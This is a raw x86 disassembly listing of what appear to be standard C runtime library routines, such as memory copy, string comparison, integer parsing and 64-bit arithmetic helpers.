  426acd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426acf:	cld    
  426ad0:	jmp    DWORD PTR [edx*4+0x426b78]
  426ad7:	nop
  426ad8:	mov    al,BYTE PTR [esi+0x3]
  426adb:	and    edx,ecx
  426add:	mov    BYTE PTR [edi+0x3],al
  426ae0:	mov    al,BYTE PTR [esi+0x2]
  426ae3:	mov    BYTE PTR [edi+0x2],al
  426ae6:	mov    al,BYTE PTR [esi+0x1]
  426ae9:	shr    ecx,0x2
  426aec:	mov    BYTE PTR [edi+0x1],al
  426aef:	sub    esi,0x3
  426af2:	sub    edi,0x3
  426af5:	cmp    ecx,0x8
  426af8:	jb     0x426a54
  426afe:	std    
  426aff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b01:	cld    
  426b02:	jmp    DWORD PTR [edx*4+0x426b78]
  426b09:	lea    ecx,[ecx+0x0]
  426b0c:	sub    al,0x6b
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2],dh
  426b12:	inc    edx
  426b13:	add    BYTE PTR [ebx+ebp*2],bh
  426b16:	inc    edx
  426b17:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b1b:	add    BYTE PTR [ebx+ebp*2+0x42],cl
  426b1f:	add    BYTE PTR [ebx+ebp*2+0x42],dl
  426b23:	add    BYTE PTR [ebx+ebp*2+0x42],bl
  426b27:	add    BYTE PTR [edi+0x6b],ch
  426b2a:	inc    edx
  426b2b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b31:	inc    esp
  426b32:	(bad)  
  426b33:	sbb    al,0x8b
  426b35:	inc    esp
  426b36:	mov    ds,WORD PTR [eax]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b40:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b50:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b54:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b58:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b5c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b60:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b64:	lea    eax,[ecx*4+0x0]
  426b6b:	add    esi,eax
  426b6d:	add    edi,eax
  426b6f:	jmp    DWORD PTR [edx*4+0x426b78]
  426b76:	mov    edi,edi
  426b78:	mov    BYTE PTR [ebx+0x42],ch
  426b7b:	add    BYTE PTR [eax-0x5fffbd95],dl
  426b81:	imul   eax,DWORD PTR [edx+0x0],0xffffffb4
  426b85:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b89:	inc    ebp
  426b8a:	or     BYTE PTR [esi+0x5f],bl
  426b8d:	leave  
  426b8e:	ret    
  426b8f:	nop
  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    eax,DWORD PTR [ebp+0x8]
  426b99:	pop    esi
  426b9a:	pop    edi
  426b9b:	leave  
  426b9c:	ret    
  426b9d:	lea    ecx,[ecx+0x0]
  426ba0:	mov    al,BYTE PTR [esi+0x3]
  426ba3:	mov    BYTE PTR [edi+0x3],al
  426ba6:	mov    al,BYTE PTR [esi+0x2]
  426ba9:	mov    BYTE PTR [edi+0x2],al
  426bac:	mov    eax,DWORD PTR [ebp+0x8]
  426baf:	pop    esi
  426bb0:	pop    edi
  426bb1:	leave  
  426bb2:	ret    
  426bb3:	nop
  426bb4:	mov    al,BYTE PTR [esi+0x3]
  426bb7:	mov    BYTE PTR [edi+0x3],al
  426bba:	mov    al,BYTE PTR [esi+0x2]
  426bbd:	mov    BYTE PTR [edi+0x2],al
  426bc0:	mov    al,BYTE PTR [esi+0x1]
  426bc3:	mov    BYTE PTR [edi+0x1],al
  426bc6:	mov    eax,DWORD PTR [ebp+0x8]
  426bc9:	pop    esi
  426bca:	pop    edi
  426bcb:	leave  
  426bcc:	ret    
  426bcd:	push   ebp
  426bce:	mov    ebp,esp
  426bd0:	sub    esp,0xc
  426bd3:	mov    eax,ds:0x465660
  426bd8:	xor    eax,DWORD PTR [ebp+0x4]
  426bdb:	and    BYTE PTR [ebp-0x6],0x0
  426bdf:	push   0x6
  426be1:	mov    DWORD PTR [ebp-0x4],eax
  426be4:	lea    eax,[ebp-0xc]
  426be7:	push   eax
  426be8:	push   0x1004
  426bed:	push   DWORD PTR [ebp+0x8]
  426bf0:	call   DWORD PTR ds:0x428110
  426bf6:	test   eax,eax
  426bf8:	jne    0x426bff
  426bfa:	or     eax,0xffffffff
  426bfd:	jmp    0x426c09
  426bff:	lea    eax,[ebp-0xc]
  426c02:	push   eax
  426c03:	call   0x426f0e
  426c08:	pop    ecx
  426c09:	mov    ecx,DWORD PTR [ebp-0x4]
  426c0c:	xor    ecx,DWORD PTR [ebp+0x4]
  426c0f:	call   0x42401c
  426c14:	leave  
  426c15:	ret    
  426c16:	push   0x38
  426c18:	push   0x428ef8
  426c1d:	call   0x423950
  426c22:	mov    eax,ds:0x465660
  426c27:	xor    eax,DWORD PTR [ebp+0x4]
  426c2a:	mov    DWORD PTR [ebp-0x1c],eax
  426c2d:	xor    edi,edi
  426c2f:	mov    DWORD PTR [ebp-0x20],edi
  426c32:	mov    DWORD PTR [ebp-0x24],edi
  426c35:	mov    eax,DWORD PTR [ebp+0x14]
  426c38:	mov    ebx,DWORD PTR [eax]
  426c3a:	mov    DWORD PTR [ebp-0x28],ebx
  426c3d:	mov    DWORD PTR [ebp-0x2c],edi
  426c40:	mov    eax,DWORD PTR [ebp+0x8]
  426c43:	cmp    eax,DWORD PTR [ebp+0xc]
  426c46:	je     0x426dbf
  426c4c:	lea    ecx,[ebp-0x40]
  426c4f:	push   ecx
  426c50:	push   eax
  426c51:	mov    esi,DWORD PTR ds:0x4280dc
  426c57:	call   esi
  426c59:	test   eax,eax
  426c5b:	je     0x426c7d
  426c5d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c61:	jne    0x426c7d
  426c63:	lea    eax,[ebp-0x40]
  426c66:	push   eax
  426c67:	push   DWORD PTR [ebp+0xc]
  426c6a:	call   esi
  426c6c:	test   eax,eax
  426c6e:	je     0x426c7d
  426c70:	cmp    DWORD PTR [ebp-0x40],0x1
  426c74:	jne    0x426c7d
  426c76:	mov    DWORD PTR [ebp-0x2c],0x1
  426c7d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c80:	je     0x426c9c
  426c82:	cmp    ebx,0xffffffff
  426c85:	je     0x426c8b
  426c87:	mov    esi,ebx
  426c89:	jmp    0x426c97
  426c8b:	push   DWORD PTR [ebp+0x10]
  426c8e:	call   0x423f60
  426c93:	pop    ecx
  426c94:	mov    esi,eax
  426c96:	inc    esi
  426c97:	mov    DWORD PTR [ebp-0x44],esi
  426c9a:	jmp    0x426c9f
  426c9c:	mov    esi,DWORD PTR [ebp-0x44]
  426c9f:	cmp    DWORD PTR [ebp-0x2c],edi
  426ca2:	jne    0x426cbe
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   ebx
  426ca7:	push   DWORD PTR [ebp+0x10]
  426caa:	push   0x1
  426cac:	push   DWORD PTR [ebp+0x8]
  426caf:	call   DWORD PTR ds:0x428100
  426cb5:	mov    esi,eax
  426cb7:	mov    DWORD PTR [ebp-0x44],esi
  426cba:	cmp    esi,edi
  426cbc:	je     0x426d16
  426cbe:	mov    DWORD PTR [ebp-0x4],edi
  426cc1:	lea    eax,[esi+esi*1]
  426cc4:	add    eax,0x3
  426cc7:	and    eax,0xfffffffc
  426cca:	call   0x4239a0
  426ccf:	mov    DWORD PTR [ebp-0x18],esp
  426cd2:	mov    ebx,esp
  426cd4:	mov    DWORD PTR [ebp-0x48],ebx
  426cd7:	lea    eax,[esi+esi*1]
  426cda:	push   eax
  426cdb:	push   edi
  426cdc:	push   ebx
  426cdd:	call   0x426250
  426ce2:	add    esp,0xc
  426ce5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426ce9:	jmp    0x426d02
  426ceb:	xor    eax,eax
  426ced:	inc    eax
  426cee:	ret    
  426cef:	mov    esp,DWORD PTR [ebp-0x18]
  426cf2:	call   0x426de5
  426cf7:	xor    edi,edi
  426cf9:	xor    ebx,ebx
  426cfb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cff:	mov    esi,DWORD PTR [ebp-0x44]
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d24
  426d06:	push   esi
  426d07:	push   0x2
  426d09:	call   0x424a68
  426d0e:	pop    ecx
  426d0f:	pop    ecx
  426d10:	mov    ebx,eax
  426d12:	cmp    ebx,edi
  426d14:	jne    0x426d1d
  426d16:	xor    eax,eax
  426d18:	jmp    0x426dd1
  426d1d:	mov    DWORD PTR [ebp-0x24],0x1
  426d24:	push   esi
  426d25:	push   ebx
  426d26:	push   DWORD PTR [ebp-0x28]
  426d29:	push   DWORD PTR [ebp+0x10]
  426d2c:	push   0x1
  426d2e:	push   DWORD PTR [ebp+0x8]
  426d31:	call   DWORD PTR ds:0x428100
  426d37:	test   eax,eax
  426d39:	je     0x426dc2
  426d3f:	cmp    DWORD PTR [ebp+0x18],edi
  426d42:	je     0x426d64
  426d44:	push   edi
  426d45:	push   edi
  426d46:	push   DWORD PTR [ebp+0x1c]
  426d49:	push   DWORD PTR [ebp+0x18]
  426d4c:	push   esi
  426d4d:	push   ebx
  426d4e:	push   edi
  426d4f:	push   DWORD PTR [ebp+0xc]
  426d52:	call   DWORD PTR ds:0x428090
  426d58:	test   eax,eax
  426d5a:	je     0x426dc2
  426d5c:	mov    eax,DWORD PTR [ebp+0x18]
  426d5f:	mov    DWORD PTR [ebp-0x20],eax
  426d62:	jmp    0x426dc2
  426d64:	cmp    DWORD PTR [ebp-0x2c],edi
  426d67:	jne    0x426d7f
  426d69:	push   edi
  426d6a:	push   edi
  426d6b:	push   edi
  426d6c:	push   edi
  426d6d:	push   esi
  426d6e:	push   ebx
  426d6f:	push   edi
  426d70:	push   DWORD PTR [ebp+0xc]
  426d73:	call   DWORD PTR ds:0x428090
  426d79:	mov    esi,eax
  426d7b:	cmp    esi,edi
  426d7d:	je     0x426dc2
  426d7f:	push   esi
  426d80:	push   0x1
  426d82:	call   0x424a68
  426d87:	pop    ecx
  426d88:	pop    ecx
  426d89:	mov    DWORD PTR [ebp-0x20],eax
  426d8c:	cmp    eax,edi
  426d8e:	je     0x426dc2
  426d90:	push   edi
  426d91:	push   edi
  426d92:	push   esi
  426d93:	push   eax
  426d94:	push   esi
  426d95:	push   ebx
  426d96:	push   edi
  426d97:	push   DWORD PTR [ebp+0xc]
  426d9a:	call   DWORD PTR ds:0x428090
  426da0:	cmp    eax,edi
  426da2:	jne    0x426db2
  426da4:	push   DWORD PTR [ebp-0x20]
  426da7:	call   0x42455a
  426dac:	pop    ecx
  426dad:	mov    DWORD PTR [ebp-0x20],edi
  426db0:	jmp    0x426dc2
  426db2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426db6:	je     0x426dc2
  426db8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dbb:	mov    DWORD PTR [ecx],eax
  426dbd:	jmp    0x426dc2
  426dbf:	mov    ebx,DWORD PTR [ebp-0x48]
  426dc2:	cmp    DWORD PTR [ebp-0x24],edi
  426dc5:	je     0x426dce
  426dc7:	push   ebx
  426dc8:	call   0x42455a
  426dcd:	pop    ecx
  426dce:	mov    eax,DWORD PTR [ebp-0x20]
  426dd1:	lea    esp,[ebp-0x54]
  426dd4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dd7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dda:	call   0x42401c
  426ddf:	call   0x42398b
  426de4:	ret    
  426de5:	push   ebp
  426de6:	mov    ebp,esp
  426de8:	sub    esp,0x48
  426deb:	push   ebx
  426dec:	push   esi
  426ded:	push   edi
  426dee:	push   0x4
  426df0:	pop    eax
  426df1:	call   0x4239a0
  426df6:	mov    ebx,esp
  426df8:	push   0x1c
  426dfa:	lea    eax,[ebp-0x24]
  426dfd:	push   eax
  426dfe:	push   ebx
  426dff:	call   DWORD PTR ds:0x428024
  426e05:	test   eax,eax
  426e07:	je     0x426e7a
  426e09:	mov    edi,DWORD PTR [ebp-0x20]
  426e0c:	lea    eax,[ebp-0x48]
  426e0f:	push   eax
  426e10:	call   DWORD PTR ds:0x428038
  426e16:	mov    eax,DWORD PTR [ebp-0x44]
  426e19:	lea    esi,[eax-0x1]
  426e1c:	not    esi
  426e1e:	and    esi,ebx
  426e20:	sub    esi,eax
  426e22:	mov    DWORD PTR [ebp-0x4],eax
  426e25:	mov    eax,ds:0x465d04
  426e2a:	mov    ecx,eax
  426e2c:	dec    ecx
  426e2d:	neg    ecx
  426e2f:	sbb    ecx,ecx
  426e31:	and    ecx,0xffff1000
  426e37:	add    ecx,0x11000
  426e3d:	add    ecx,edi
  426e3f:	cmp    esi,ecx
  426e41:	jb     0x426e7a
  426e43:	cmp    eax,0x1
  426e46:	je     0x426e92
  426e48:	mov    ebx,edi
  426e4a:	mov    edi,0x1000
  426e4f:	push   0x1c
  426e51:	lea    eax,[ebp-0x24]
  426e54:	push   eax
  426e55:	push   ebx
  426e56:	call   DWORD PTR ds:0x428024
  426e5c:	test   eax,eax
  426e5e:	je     0x426e7a
  426e60:	add    ebx,DWORD PTR [ebp-0x18]
  426e63:	test   DWORD PTR [ebp-0x14],edi
  426e66:	je     0x426e4f
  426e68:	test   BYTE PTR [ebp-0xf],0x1
  426e6c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e6f:	je     0x426e76
  426e71:	xor    eax,eax
  426e73:	inc    eax
  426e74:	jmp    0x426eae
  426e76:	cmp    esi,ebx
  426e78:	jae    0x426e7e
  426e7a:	xor    eax,eax
  426e7c:	jmp    0x426eae
  426e7e:	push   0x4
  426e80:	push   edi
  426e81:	push   DWORD PTR [ebp-0x4]
  426e84:	push   ebx
  426e85:	call   DWORD PTR ds:0x4280e4
  426e8b:	mov    eax,ds:0x465d04
  426e90:	jmp    0x426e94
  426e92:	mov    ebx,esi
  426e94:	dec    eax
  426e95:	neg    eax
  426e97:	sbb    eax,eax
  426e99:	and    eax,0x103
  426e9e:	lea    ecx,[ebp-0x8]
  426ea1:	push   ecx
  426ea2:	inc    eax
  426ea3:	push   eax
  426ea4:	push   DWORD PTR [ebp-0x4]
  426ea7:	push   ebx
  426ea8:	call   DWORD PTR ds:0x428054
  426eae:	lea    esp,[ebp-0x54]
  426eb1:	pop    edi
  426eb2:	pop    esi
  426eb3:	pop    ebx
  426eb4:	leave  
  426eb5:	ret    
  426eb6:	int3   
  426eb7:	int3   
  426eb8:	int3   
  426eb9:	int3   
  426eba:	int3   
  426ebb:	int3   
  426ebc:	int3   
  426ebd:	int3   
  426ebe:	int3   
  426ebf:	int3   
  426ec0:	push   ebp
  426ec1:	mov    ebp,esp
  426ec3:	push   edi
  426ec4:	push   esi
  426ec5:	push   ebx
  426ec6:	mov    esi,DWORD PTR [ebp+0xc]
  426ec9:	mov    edi,DWORD PTR [ebp+0x8]
  426ecc:	mov    al,0xff
  426ece:	mov    edi,edi
  426ed0:	or     al,al
  426ed2:	je     0x426f06
  426ed4:	mov    al,BYTE PTR [esi]
  426ed6:	add    esi,0x1
  426ed9:	mov    ah,BYTE PTR [edi]
  426edb:	add    edi,0x1
  426ede:	cmp    ah,al
  426ee0:	je     0x426ed0
  426ee2:	sub    al,0x41
  426ee4:	cmp    al,0x1a
  426ee6:	sbb    cl,cl
  426ee8:	and    cl,0x20
  426eeb:	add    al,cl
  426eed:	add    al,0x41
  426eef:	xchg   al,ah
  426ef1:	sub    al,0x41
  426ef3:	cmp    al,0x1a
  426ef5:	sbb    cl,cl
  426ef7:	and    cl,0x20
  426efa:	add    al,cl
  426efc:	add    al,0x41
  426efe:	cmp    al,ah
  426f00:	je     0x426ed0
  426f02:	sbb    al,al
  426f04:	sbb    al,0xff
  426f06:	movsx  eax,al
  426f09:	pop    ebx
  426f0a:	pop    esi
  426f0b:	pop    edi
  426f0c:	leave  
  426f0d:	ret    
  426f0e:	push   esi
  426f0f:	push   edi
  426f10:	call   0x423803
  426f15:	mov    edi,DWORD PTR [eax+0x64]
  426f18:	cmp    edi,DWORD PTR ds:0x4657bc
  426f1e:	je     0x426f27
  426f20:	call   0x424caf
  426f25:	mov    edi,eax
  426f27:	mov    esi,DWORD PTR [esp+0xc]
  426f2b:	cmp    DWORD PTR [edi+0x28],0x1
  426f2f:	movzx  eax,BYTE PTR [esi]
  426f32:	jle    0x426f42
  426f34:	push   0x8
  426f36:	push   eax
  426f37:	push   edi
  426f38:	call   0x426f96
  426f3d:	add    esp,0xc
  426f40:	jmp    0x426f4c
  426f42:	mov    ecx,DWORD PTR [edi+0x48]
  426f45:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f49:	and    eax,0x8
  426f4c:	test   eax,eax
  426f4e:	je     0x426f53
  426f50:	inc    esi
  426f51:	jmp    0x426f2b
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	cmp    ecx,0x2d
  426f5a:	mov    edx,ecx
  426f5c:	je     0x426f63
  426f5e:	cmp    ecx,0x2b
  426f61:	jne    0x426f67
  426f63:	movzx  ecx,BYTE PTR [esi]
  426f66:	inc    esi
  426f67:	xor    eax,eax
  426f69:	cmp    ecx,0x30
  426f6c:	jl     0x426f78
  426f6e:	cmp    ecx,0x39
  426f71:	jg     0x426f78
  426f73:	sub    ecx,0x30
  426f76:	jmp    0x426f7b
  426f78:	or     ecx,0xffffffff
  426f7b:	cmp    ecx,0xffffffff
  426f7e:	je     0x426f8c
  426f80:	lea    eax,[eax+eax*4]
  426f83:	lea    eax,[ecx+eax*2]
  426f86:	movzx  ecx,BYTE PTR [esi]
  426f89:	inc    esi
  426f8a:	jmp    0x426f69
  426f8c:	cmp    edx,0x2d
  426f8f:	pop    edi
  426f90:	pop    esi
  426f91:	jne    0x426f95
  426f93:	neg    eax
  426f95:	ret    
  426f96:	push   ebp
  426f97:	mov    ebp,esp
  426f99:	push   ecx
  426f9a:	mov    eax,DWORD PTR [ebp+0xc]
  426f9d:	lea    ecx,[eax+0x1]
  426fa0:	cmp    ecx,0x100
  426fa6:	mov    ecx,DWORD PTR [ebp+0x8]
  426fa9:	ja     0x426fb4
  426fab:	mov    ecx,DWORD PTR [ecx+0x48]
  426fae:	movzx  eax,WORD PTR [ecx+eax*2]
  426fb2:	jmp    0x427008
  426fb4:	push   esi
  426fb5:	mov    edx,eax
  426fb7:	sar    edx,0x8
  426fba:	push   edi
  426fbb:	mov    edi,DWORD PTR [ecx+0x48]
  426fbe:	movzx  esi,dl
  426fc1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fc6:	pop    edi
  426fc7:	pop    esi
  426fc8:	je     0x426fd9
  426fca:	and    BYTE PTR [ebp-0x2],0x0
  426fce:	push   0x2
  426fd0:	mov    BYTE PTR [ebp-0x3],al
  426fd3:	mov    BYTE PTR [ebp-0x4],dl
  426fd6:	pop    eax
  426fd7:	jmp    0x426fe3
  426fd9:	and    BYTE PTR [ebp-0x3],0x0
  426fdd:	mov    BYTE PTR [ebp-0x4],al
  426fe0:	xor    eax,eax
  426fe2:	inc    eax
  426fe3:	push   0x1
  426fe5:	push   DWORD PTR [ecx+0x14]
  426fe8:	push   DWORD PTR [ecx+0x4]
  426feb:	lea    ecx,[ebp+0xe]
  426fee:	push   ecx
  426fef:	push   eax
  426ff0:	lea    eax,[ebp-0x4]
  426ff3:	push   eax
  426ff4:	push   0x1
  426ff6:	call   0x426078
  426ffb:	add    esp,0x1c
  426ffe:	test   eax,eax
  427000:	jne    0x427004
  427002:	leave  
  427003:	ret    
  427004:	movzx  eax,WORD PTR [ebp+0xe]
  427008:	and    eax,DWORD PTR [ebp+0x10]
  42700b:	leave  
  42700c:	ret    
  42700d:	int3   
  42700e:	int3   
  42700f:	int3   
  427010:	mov    eax,DWORD PTR [esp+0x8]
  427014:	mov    ecx,DWORD PTR [esp+0x10]
  427018:	or     ecx,eax
  42701a:	mov    ecx,DWORD PTR [esp+0xc]
  42701e:	jne    0x427029
  427020:	mov    eax,DWORD PTR [esp+0x4]
  427024:	mul    ecx
  427026:	ret    0x10
  427029:	push   ebx
  42702a:	mul    ecx
  42702c:	mov    ebx,eax
  42702e:	mov    eax,DWORD PTR [esp+0x8]
  427032:	mul    DWORD PTR [esp+0x14]
  427036:	add    ebx,eax
  427038:	mov    eax,DWORD PTR [esp+0x8]
  42703c:	mul    ecx
  42703e:	add    edx,ebx
  427040:	pop    ebx
  427041:	ret    0x10
  427044:	int3   
  427045:	int3   
  427046:	int3   
  427047:	int3   
  427048:	int3   
  427049:	int3   
  42704a:	int3   
  42704b:	int3   
  42704c:	int3   
  42704d:	int3   
  42704e:	int3   
  42704f:	int3   
  427050:	push   ebp
  427051:	mov    ebp,esp
  427053:	push   edi
  427054:	push   esi
  427055:	push   ebx
  427056:	mov    ecx,DWORD PTR [ebp+0x10]
  427059:	or     ecx,ecx
  42705b:	je     0x4270aa
  42705d:	mov    esi,DWORD PTR [ebp+0x8]
  427060:	mov    edi,DWORD PTR [ebp+0xc]
  427063:	mov    bh,0x41
  427065:	mov    bl,0x5a
  427067:	mov    dh,0x20
  427069:	lea    ecx,[ecx+0x0]
  42706c:	mov    ah,BYTE PTR [esi]
  42706e:	or     ah,ah
  427070:	mov    al,BYTE PTR [edi]
  427072:	je     0x42709b
  427074:	or     al,al
  427076:	je     0x42709b
  427078:	add    esi,0x1
  42707b:	add    edi,0x1
  42707e:	cmp    ah,bh
  427080:	jb     0x427088
  427082:	cmp    ah,bl
  427084:	ja     0x427088
  427086:	add    ah,dh
  427088:	cmp    al,bh
  42708a:	jb     0x427092
  42708c:	cmp    al,bl
  42708e:	ja     0x427092
  427090:	add    al,dh
  427092:	cmp    ah,al
  427094:	jne    0x4270a1
  427096:	sub    ecx,0x1
  427099:	jne    0x42706c
  42709b:	xor    ecx,ecx
  42709d:	cmp    ah,al
  42709f:	je     0x4270aa
  4270a1:	mov    ecx,0xffffffff
  4270a6:	jb     0x4270aa
  4270a8:	neg    ecx
  4270aa:	mov    eax,ecx
  4270ac:	pop    ebx
  4270ad:	pop    esi
  4270ae:	pop    edi
  4270af:	leave  
  4270b0:	ret    
  4270b1:	int3   
  4270b2:	int3   
  4270b3:	int3   
  4270b4:	int3   
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	push   esi
  4270c1:	mov    eax,DWORD PTR [esp+0x14]
  4270c5:	or     eax,eax
  4270c7:	jne    0x4270f1
  4270c9:	mov    ecx,DWORD PTR [esp+0x10]
  4270cd:	mov    eax,DWORD PTR [esp+0xc]
  4270d1:	xor    edx,edx
  4270d3:	div    ecx
  4270d5:	mov    ebx,eax
  4270d7:	mov    eax,DWORD PTR [esp+0x8]
  4270db:	div    ecx
  4270dd:	mov    esi,eax
  4270df:	mov    eax,ebx
  4270e1:	mul    DWORD PTR [esp+0x10]
  4270e5:	mov    ecx,eax
  4270e7:	mov    eax,esi
  4270e9:	mul    DWORD PTR [esp+0x10]
  4270ed:	add    edx,ecx
  4270ef:	jmp    0x427138
  4270f1:	mov    ecx,eax
  4270f3:	mov    ebx,DWORD PTR [esp+0x10]
  4270f7:	mov    edx,DWORD PTR [esp+0xc]
  4270fb:	mov    eax,DWORD PTR [esp+0x8]
  4270ff:	shr    ecx,1
  427101:	rcr    ebx,1
  427103:	shr    edx,1
  427105:	rcr    eax,1
  427107:	or     ecx,ecx
  427109:	jne    0x4270ff
  42710b:	div    ebx
  42710d:	mov    esi,eax
  42710f:	mul    DWORD PTR [esp+0x14]
  427113:	mov    ecx,eax
  427115:	mov    eax,DWORD PTR [esp+0x10]
  427119:	mul    esi
  42711b:	add    edx,ecx
  42711d:	jb     0x42712d
  42711f:	cmp    edx,DWORD PTR [esp+0xc]
  427123:	ja     0x42712d
  427125:	jb     0x427136
  427127:	cmp    eax,DWORD PTR [esp+0x8]
  42712b:	jbe    0x427136
  42712d:	dec    esi
  42712e:	sub    eax,DWORD PTR [esp+0x10]
  427132:	sbb    edx,DWORD PTR [esp+0x14]
  427136:	xor    ebx,ebx
  427138:	sub    eax,DWORD PTR [esp+0x8]
  42713c:	sbb    edx,DWORD PTR [esp+0xc]
  427140:	neg    edx
  427142:	neg    eax
  427144:	sbb    edx,0x0
  427147:	mov    ecx,edx
  427149:	mov    edx,ebx
  42714b:	mov    ebx,ecx
  42714d:	mov    ecx,eax
  42714f:	mov    eax,esi
  427151:	pop    esi
  427152:	ret    0x10
  427155:	int3   
  427156:	int3   
  427157:	int3   
  427158:	int3   
  427159:	int3   
  42715a:	int3   
  42715b:	int3   
  42715c:	int3   
  42715d:	int3   
  42715e:	int3   
  42715f:	int3   
  427160:	lea    eax,[edx-0x1]
  427163:	pop    ebx
  427164:	ret    
  427165:	lea    esp,[esp+0x0]
  42716c:	lea    esp,[esp+0x0]
  427170:	xor    eax,eax
  427172:	mov    al,BYTE PTR [esp+0x8]
  427176:	push   ebx
  427177:	mov    ebx,eax
  427179:	shl    eax,0x8
  42717c:	mov    edx,DWORD PTR [esp+0x8]
  427180:	test   edx,0x3
  427186:	je     0x42719d
  427188:	mov    cl,BYTE PTR [edx]
  42718a:	add    edx,0x1
  42718d:	cmp    cl,bl
  42718f:	je     0x427160
  427191:	test   cl,cl
  427193:	je     0x4271e6
  427195:	test   edx,0x3
  42719b:	jne    0x427188
  42719d:	or     ebx,eax
  42719f:	push   edi
  4271a0:	mov    eax,ebx
  4271a2:	shl    ebx,0x10
  4271a5:	push   esi
  4271a6:	or     ebx,eax
  4271a8:	mov    ecx,DWORD PTR [edx]
  4271aa:	mov    edi,0x7efefeff
  4271af:	mov    eax,ecx
  4271b1:	mov    esi,edi
  4271b3:	xor    ecx,ebx
  4271b5:	add    esi,eax
  4271b7:	add    edi,ecx
  4271b9:	xor    ecx,0xffffffff
  4271bc:	xor    eax,0xffffffff
  4271bf:	xor    ecx,edi
  4271c1:	xor    eax,esi
  4271c3:	add    edx,0x4
  4271c6:	and    ecx,0x81010100
  4271cc:	jne    0x4271ea
  4271ce:	and    eax,0x81010100
  4271d3:	je     0x4271a8
  4271d5:	and    eax,0x1010100
  4271da:	jne    0x4271e4
  4271dc:	and    esi,0x80000000
  4271e2:	jne    0x4271a8
  4271e4:	pop    esi
  4271e5:	pop    edi
  4271e6:	pop    ebx
  4271e7:	xor    eax,eax
  4271e9:	ret    
  4271ea:	mov    eax,DWORD PTR [edx-0x4]
  4271ed:	cmp    al,bl
  4271ef:	je     0x427227
  4271f1:	test   al,al
  4271f3:	je     0x4271e4
  4271f5:	cmp    ah,bl
  4271f7:	je     0x427220
  4271f9:	test   ah,ah
  4271fb:	je     0x4271e4
  4271fd:	shr    eax,0x10
  427200:	cmp    al,bl
  427202:	je     0x427219
  427204:	test   al,al
  427206:	je     0x4271e4
  427208:	cmp    ah,bl
  42720a:	je     0x427212
  42720c:	test   ah,ah
  42720e:	je     0x4271e4
  427210:	jmp    0x4271a8
  427212:	pop    esi
  427213:	pop    edi
  427214:	lea    eax,[edx-0x1]
  427217:	pop    ebx
  427218:	ret    
  427219:	lea    eax,[edx-0x2]
  42721c:	pop    esi
  42721d:	pop    edi
  42721e:	pop    ebx
  42721f:	ret    
  427220:	lea    eax,[edx-0x3]
  427223:	pop    esi
  427224:	pop    edi
  427225:	pop    ebx
  427226:	ret    
  427227:	lea    eax,[edx-0x4]
  42722a:	pop    esi
  42722b:	pop    edi
  42722c:	pop    ebx
  42722d:	ret    
  42722e:	jmp    DWORD PTR ds:0x428058
